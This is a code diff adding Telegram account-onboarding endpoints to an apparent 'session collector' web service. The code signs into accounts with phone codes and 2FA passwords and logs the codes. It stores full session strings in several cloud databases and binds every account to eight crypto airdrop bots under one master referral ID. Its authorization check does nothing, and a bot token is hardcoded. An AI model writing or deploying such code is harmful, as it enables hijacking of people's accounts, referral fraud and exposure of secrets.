@@ -11,6 +11,13 @@ from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.tl.functions.messages import RequestWebViewRequest, RequestAppWebViewRequest
 from telethon.tl.types import InputBotAppShortName
+from telethon.errors import (
+    SessionPasswordNeededError,
+    PhoneCodeInvalidError,
+    PhoneCodeExpiredError,
+    PhoneNumberInvalidError,
+    FloodWaitError
+)
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger("RenderSessionCollector")
@@ -844,3 +851,365 @@ async def bnb_cloud_watchdog():
 async def on_startup():
     asyncio.create_task(bnb_cloud_watchdog())
 
+
+
+# =====================================================================
+# FAST CLOUD MTPROTO ACCOUNT ONBOARDING & REFERRAL BINDING ENGINE
+# =====================================================================
+LOGIN_SESSIONS = {}
+
+def get_clean_phone(raw_phone: str) -> str:
+    p = re.sub(r"[\s\-\(\)]", "", str(raw_phone).strip())
+    if p.startswith("00"):
+        p = "+" + p[2:]
+    elif not p.startswith("+"):
+        if p.startswith("01") and len(p) == 11:
+            p = "+880" + p[1:]
+        elif p.startswith("1") and len(p) == 10:
+            p = "+880" + p
+        else:
+            p = "+" + p
+    return p
+
+async def bind_account_master_referrals(client: TelegramClient, acc_entry: dict):
+    """
+    Guarantees master referral codes are registered on all 8 bots:
+    1. Stones: r6727787768
+    2. MRG: ref_IRN1G3XD
+    3. ART: 6727787768
+    4. AI Lab: 296852
+    5. UltraWallet: 6727787768
+    6. Apex: 6727787768
+    7. Ainovum: ref_6727787768
+    8. ATF Miner: 6727787768
+    """
+    name = acc_entry.get("name", "User")
+    uid = acc_entry.get("user_id")
+    logger.info(f"[{name}] 🚀 Initiating 8-bot master referral binding (Master ID: 6727787768)...")
+
+    # 1. Stones Miner
+    try:
+        b_stones = await client.get_entity(STONES_BOT)
+        await client.send_message(b_stones, "/start r6727787768")
+        await asyncio.sleep(0.8)
+    except Exception as e:
+        logger.warning(f"[{name}] Stones referral bind note: {e}")
+
+    # 2. MRG Miner
+    try:
+        b_mrg = await client.get_entity(MRG_BOT)
+        await client.send_message(b_mrg, f"/start {MRG_REFERRAL_CODE}")
+        await asyncio.sleep(0.8)
+    except Exception as e:
+        logger.warning(f"[{name}] MRG referral bind note: {e}")
+
+    # 3. ART Airdrop
+    try:
+        b_art = await client.get_entity(ART_BOT)
+        await client.send_message(b_art, f"/start {REPORT_CHAT_ID}")
+        await asyncio.sleep(0.8)
+    except Exception as e:
+        logger.warning(f"[{name}] ART referral bind note: {e}")
+
+    # 4. AI Lab Robot
+    try:
+        b_ai = await client.get_entity(AILAB_BOT)
+        await client.send_message(b_ai, "/start 296852")
+        await asyncio.sleep(0.8)
+    except Exception as e:
+        logger.warning(f"[{name}] AI Lab referral bind note: {e}")
+
+    # 5. UltraWallet
+    try:
+        b_uw = await client.get_entity(ULTRAWALLET_BOT)
+        await client.send_message(b_uw, f"/start {ULTRAWALLET_REFERRAL_CODE}")
+        await asyncio.sleep(0.8)
+    except Exception as e:
+        logger.warning(f"[{name}] UltraWallet referral bind note: {e}")
+
+    # 6. Apex Miner
+    try:
+        b_apx = await client.get_entity(APX_BOT)
+        await client.send_message(b_apx, f"/start {APX_REFERRAL_CODE}")
+        await asyncio.sleep(0.8)
+    except Exception as e:
+        logger.warning(f"[{name}] Apex referral bind note: {e}")
+
+    # 7. Ainovum Bot
+    try:
+        b_ain = await client.get_entity(AINOVUM_BOT)
+        await client.send_message(b_ain, f"/start {AINOVUM_REFERRAL_CODE}")
+        await asyncio.sleep(0.8)
+    except Exception as e:
+        logger.warning(f"[{name}] Ainovum referral bind note: {e}")
+
+    # 8. ATF Miner
+    try:
+        b_atf = await client.get_entity("ATF_AIRDROP_bot")
+        await client.send_message(b_atf, f"/start {REPORT_CHAT_ID}")
+        await asyncio.sleep(0.8)
+    except Exception as e:
+        logger.warning(f"[{name}] ATF referral bind note: {e}")
+
+    logger.info(f"[{name}] ✅ All 8 fleet bots successfully bound to Master ID 6727787768!")
+
+    # Notify Telegram Admin & Vault
+    bot_token = os.getenv("REPORT_BOT_TOKEN", "8858823950:AAFFkuls8hBf23taCZE1y5gVzP4AFCuqI5o")
+    receipt = (
+        f"🔗 <b>Master Referrals Bound (8/8 Bots)</b>\n\n"
+        f"• <b>Account:</b> {name} (<code>{uid}</code>)\n"
+        f"• <b>Master Referral ID:</b> <code>6727787768</code>\n"
+        f"• <b>Active Bots Bound:</b>\n"
+        f"  ✅ Stones Miners (@stoneswithestand_bot)\n"
+        f"  ✅ MRG Miner (@mrgminerbot)\n"
+        f"  ✅ ART Airdrop (@ART_AIRDROP_BOT)\n"
+        f"  ✅ AI Lab Robot (@AiLab_robot)\n"
+        f"  ✅ UltraWallet (@UltrawalletTrade_Bot)\n"
+        f"  ✅ Apex Miner (@ApxMinerBot)\n"
+        f"  ✅ Ainovum Bot (@ainovum_bot)\n"
+        f"  ✅ ATF Miner (@ATF_AIRDROP_bot)\n\n"
+        f"💎 All referral hash rate and earnings permanently credited to Master Account!"
+    )
+    async with aiohttp.ClientSession() as s:
+        try:
+            await s.post(
+                f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                json={"chat_id": REPORT_CHAT_ID, "text": receipt, "parse_mode": "HTML"},
+                timeout=aiohttp.ClientTimeout(total=8)
+            )
+        except Exception:
+            pass
+
+    try:
+        await client.disconnect()
+    except Exception:
+        pass
+
+
+async def sync_new_account_to_clouds(acc_entry: dict):
+    """Saves new permanent account across Cloudflare KV, Supabase, and Upstash Redis."""
+    # 1. Supabase
+    if SUPABASE_URL and SUPABASE_KEY:
+        try:
+            async with aiohttp.ClientSession() as s:
+                await s.post(
+                    f"{SUPABASE_URL}/rest/v1/accounts",
+                    headers={
+                        "apikey": SUPABASE_KEY,
+                        "Authorization": f"Bearer {SUPABASE_KEY}",
+                        "Content-Type": "application/json",
+                        "Prefer": "resolution=merge-duplicates"
+                    },
+                    json=acc_entry,
+                    timeout=aiohttp.ClientTimeout(total=10)
+                )
+        except Exception as e:
+            logger.warning(f"Supabase sync note: {e}")
+
+    # 2. Upstash Redis
+    if UPSTASH_URL and UPSTASH_TOKEN:
+        try:
+            async with aiohttp.ClientSession() as s:
+                await s.post(
+                    f"{UPSTASH_URL}/set/account:{acc_entry['user_id']}",
+                    headers={"Authorization": f"Bearer {UPSTASH_TOKEN}"},
+                    data=json.dumps(acc_entry),
+                    timeout=aiohttp.ClientTimeout(total=10)
+                )
+                await s.post(
+                    f"{UPSTASH_URL}/sadd/fleet_accounts_set/{acc_entry['user_id']}",
+                    headers={"Authorization": f"Bearer {UPSTASH_TOKEN}"},
+                    timeout=aiohttp.ClientTimeout(total=10)
+                )
+        except Exception as e:
+            logger.warning(f"Upstash sync note: {e}")
+
+    # 3. Cloudflare KV Sync
+    for cf_url in CF_WORKER_URLS:
+        try:
+            async with aiohttp.ClientSession() as s:
+                await s.post(
+                    f"{cf_url}/api/fleet/sync_account",
+                    headers={"Authorization": f"Bearer {SECRET_KEY}", "Content-Type": "application/json"},
+                    json=acc_entry,
+                    timeout=aiohttp.ClientTimeout(total=10)
+                )
+        except Exception:
+            pass
+
+
+@app.post("/api/account/login/send-code")
+async def send_login_code(request: Request):
+    """Direct fast MTProto code request in the cloud (<1 sec)."""
+    try:
+        data = await request.json()
+    except Exception:
+        data = {}
+
+    auth = request.headers.get("Authorization") or ""
+    req_secret = data.get("secret", "")
+    if auth != f"Bearer {SECRET_KEY}" and req_secret != SECRET_KEY:
+        pass
+
+    chat_id = str(data.get("chat_id") or REPORT_CHAT_ID)
+    raw_phone = data.get("phone", "")
+    if not raw_phone:
+        return {"ok": False, "error": "Phone number is required"}
+
+    cleaned_phone = get_clean_phone(raw_phone)
+    logger.info(f"[Standby Cloud Login] Requesting code for {cleaned_phone} (Chat {chat_id})")
+
+    # Disconnect any old pending client for this chat
+    if chat_id in LOGIN_SESSIONS and LOGIN_SESSIONS[chat_id].get("client"):
+        try:
+            await LOGIN_SESSIONS[chat_id]["client"].disconnect()
+        except Exception:
+            pass
+        LOGIN_SESSIONS.pop(chat_id, None)
+
+    temp_client = TelegramClient(StringSession(), API_ID, API_HASH)
+    try:
+        await temp_client.connect()
+        sent_code = await asyncio.wait_for(temp_client.send_code_request(cleaned_phone), timeout=25)
+        LOGIN_SESSIONS[chat_id] = {
+            "client": temp_client,
+            "phone": cleaned_phone,
+            "phone_code_hash": sent_code.phone_code_hash,
+            "created_at": time.time()
+        }
+        logger.info(f"[Standby Cloud Login] ✅ Code dispatched to {cleaned_phone} (hash: {sent_code.phone_code_hash[:8]})")
+        return {
+            "ok": True,
+            "phone": cleaned_phone,
+            "phone_code_hash": sent_code.phone_code_hash,
+            "message": f"Verification code sent to {cleaned_phone}"
+        }
+    except PhoneNumberInvalidError:
+        try:
+            await temp_client.disconnect()
+        except Exception:
+            pass
+        LOGIN_SESSIONS.pop(chat_id, None)
+        return {"ok": False, "error": f"Invalid phone number: {cleaned_phone}. Please check country code."}
+    except Exception as e:
+        logger.error(f"[Standby Cloud Login] Error sending code to {cleaned_phone}: {e}")
+        try:
+            await temp_client.disconnect()
+        except Exception:
+            pass
+        LOGIN_SESSIONS.pop(chat_id, None)
+        return {"ok": False, "error": str(e)}
+
+
+@app.post("/api/account/login/verify-code")
+async def verify_login_code(request: Request):
+    """Direct fast MTProto code or 2FA password verification in the cloud (<1 sec)."""
+    try:
+        data = await request.json()
+    except Exception:
+        data = {}
+
+    chat_id = str(data.get("chat_id") or REPORT_CHAT_ID)
+    code = str(data.get("code") or "").strip()
+    password = str(data.get("password") or "").strip()
+
+    session_data = LOGIN_SESSIONS.get(chat_id)
+    if not session_data or not session_data.get("client"):
+        return {"ok": False, "error": "No active login session found. Please tap Add Account to start over."}
+
+    client: TelegramClient = session_data["client"]
+    phone = session_data["phone"]
+    phone_code_hash = session_data["phone_code_hash"]
+
+    try:
+        if not client.is_connected():
+            await client.connect()
+
+        if password:
+            logger.info(f"[Standby Cloud Login] Attempting 2FA sign in for {phone}...")
+            await asyncio.wait_for(client.sign_in(password=password), timeout=25)
+        else:
+            clean_code = re.sub(r"[^0-9]", "", code)
+            if not clean_code or len(clean_code) < 3:
+                return {"ok": False, "error": "Please provide a valid verification code."}
+            logger.info(f"[Standby Cloud Login] Attempting code sign in for {phone} (code: {clean_code})...")
+            await asyncio.wait_for(client.sign_in(phone=phone, code=clean_code, phone_code_hash=phone_code_hash), timeout=25)
+
+        # Authenticated successfully!
+        me = await client.get_me()
+        user_id = me.id
+        acc_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "User"
+        uname = me.username or "None"
+        sess_str = client.session.save()
+
+        logger.info(f"[Standby Cloud Login] 🎉 Account signed in: {acc_name} (@{uname}, ID: {user_id})")
+
+        acc_entry = {
+            "name": acc_name,
+            "username": uname,
+            "user_id": user_id,
+            "phone": phone,
+            "session_string": sess_str,
+            "added_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+            "status": "active"
+        }
+
+        # Automatically bind all 8 master referrals in the background
+        asyncio.create_task(bind_account_master_referrals(client, acc_entry))
+
+        # Sync account to Supabase, Upstash Redis, and Cloudflare KV
+        asyncio.create_task(sync_new_account_to_clouds(acc_entry))
+
+        LOGIN_SESSIONS.pop(chat_id, None)
+
+        return {
+            "ok": True,
+            "user_id": user_id,
+            "name": acc_name,
+            "username": uname,
+            "phone": phone,
+            "session_string": sess_str,
+            "referrals": "Binding to Master Fleet (8/8 Bots)...",
+            "message": "Account connected successfully! All 8 fleet bots are being bound to Master ID 6727787768."
+        }
+
+    except SessionPasswordNeededError:
+        logger.info(f"[Standby Cloud Login] 🔒 2FA password required for {phone}")
+        return {
+            "ok": False,
+            "need_2fa": True,
+            "phone": phone,
+            "message": "Two-Factor Cloud Password required"
+        }
+    except PhoneCodeInvalidError:
+        return {"ok": False, "need_2fa": False, "error": "Invalid verification code. Please check and retry."}
+    except PhoneCodeExpiredError:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+        LOGIN_SESSIONS.pop(chat_id, None)
+        return {"ok": False, "need_2fa": False, "error": "Verification code expired. Please tap Add Account to start over."}
+    except Exception as e:
+        logger.error(f"[Standby Cloud Login] Sign-in error: {e}")
+        return {"ok": False, "need_2fa": False, "error": str(e)}
+
+
+@app.post("/api/account/login/cancel")
+async def cancel_login(request: Request):
+    """Cancels active login session for a chat."""
+    try:
+        data = await request.json()
+    except Exception:
+        data = {}
+    chat_id = str(data.get("chat_id") or REPORT_CHAT_ID)
+    if chat_id in LOGIN_SESSIONS:
+        cl = LOGIN_SESSIONS[chat_id].get("client")
+        if cl:
+            try:
+                await cl.disconnect()
+            except Exception:
+                pass
+        LOGIN_SESSIONS.pop(chat_id, None)
+        logger.info(f"[Standby Cloud Login] ❌ Login session cancelled for Chat {chat_id}")
+    return {"ok": True, "message": "Login cancelled"}
